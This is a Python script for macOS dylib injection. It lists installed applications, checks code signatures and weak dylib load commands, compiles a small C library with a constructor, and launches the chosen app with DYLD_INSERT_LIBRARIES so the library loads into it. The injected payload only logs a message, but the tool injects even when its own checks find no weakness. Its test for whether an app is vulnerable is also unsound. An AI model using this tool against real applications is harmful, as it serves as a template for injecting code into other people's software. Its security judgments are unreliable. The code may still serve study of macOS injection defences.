import os
import subprocess
import plistlib

def get_executable_name(app):
    """Obtém o nome real do executável do Info.plist"""
    try:
        plist_path = f"/Applications/{app}/Contents/Info.plist"
        with open(plist_path, 'rb') as f:
            plist = plistlib.load(f)
            executable = plist.get('CFBundleExecutable', app[:-4])
            return executable
    except Exception as e:
        print(f"Error reading Info.plist for {app}: {e}")
        # Fallback: remove .app extension
        return app[:-4]

def list_applications():
    applications = [app for app in os.listdir('/Applications') if app.endswith('.app')]
    for idx, app in enumerate(applications):
        print(f"{idx + 1}. {app}")
    return applications

def check_vulnerability(app):
    executable_name = get_executable_name(app)
    app_path = f"/Applications/{app}/Contents/MacOS/{executable_name}"
    
    if not os.path.exists(app_path):
        print(f"Error: Executable not found at {app_path}")
        return False
    
    try:
        result = subprocess.run(['codesign', '-vvv', '--deep', '--strict', app_path], 
                              capture_output=True, text=True)
        if 'valid on disk' in result.stdout and 'satisfies its Designated Requirement' in result.stdout:
            print(f"{app} appears to be intact and not modified.")
            return False
        else:
            print(f"{app} may have been modified.")
            return True
    except Exception as e:
        print(f"Error checking {app}: {e}")
        return True

def check_weak_dylibs(app):
    executable_name = get_executable_name(app)
    app_path = f"/Applications/{app}/Contents/MacOS/{executable_name}"
    
    try:
        result = subprocess.run(['otool', '-l', app_path], capture_output=True, text=True)
        if 'LC_LOAD_WEAK_DYLIB' in result.stdout:
            print(f"{app} has weak dylibs loaded.")
            return True
        else:
            print(f"{app} does not have weak dylibs loaded.")
            return False
    except Exception as e:
        print(f"Error checking weak dylibs for {app}: {e}")
        return False

def compile_dylib():
    c_code = """#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
    syslog(LOG_ERR, "[+] dylib injected in %s\\\\n", argv[0]);
    printf("[+] dylib injected in %s\\\\n", argv[0]);
}
"""
    with open("inject.c", "w") as file:
        file.write(c_code)
    subprocess.run(['gcc', '-dynamiclib', '-o', 'inject.dylib', 'inject.c'], check=True)
    print("Dylib compiled successfully.")

def inject_dylib(app):
    executable_name = get_executable_name(app)
    app_path = f"/Applications/{app}/Contents/MacOS/{executable_name}"
    
    if not os.path.exists(app_path):
        print(f"Error: Executable not found at {app_path}")
        return
    
    if not os.path.exists("inject.dylib"):
        print("Error: inject.dylib not found")
        return
        
    try:
        env = os.environ.copy()
        env['DYLD_INSERT_LIBRARIES'] = os.path.abspath("inject.dylib")
        subprocess.run([app_path], env=env, check=True)
        print("Injection attempted successfully")
    except Exception as e:
        print(f"Error injecting {app}: {e}")

def main():
    applications = list_applications()
    app_number = int(input("Enter the number of the software you want to attempt the injection on: ")) - 1
    selected_app = applications[app_number]
    
    print(f"Selected application: {selected_app}")
    
    executable_name = get_executable_name(selected_app)
    print(f"Executable name: {executable_name}")
    
    app_path = f"/Applications/{selected_app}/Contents/MacOS/{executable_name}"
    print(f"Full path: {app_path}")
    print(f"Path exists: {os.path.exists(app_path)}")
    
    if check_vulnerability(selected_app):
        print(f"Attempting injection on {selected_app}...")
        if check_weak_dylibs(selected_app):
            compile_dylib()
            inject_dylib(selected_app)
        else:
            print(f"{selected_app} does not have weak dylibs loaded, but attempting injection anyway.")
            compile_dylib()
            inject_dylib(selected_app)
    else:
        print(f"{selected_app} is not vulnerable to dylib injection.")

if __name__ == "__main__":
    main()
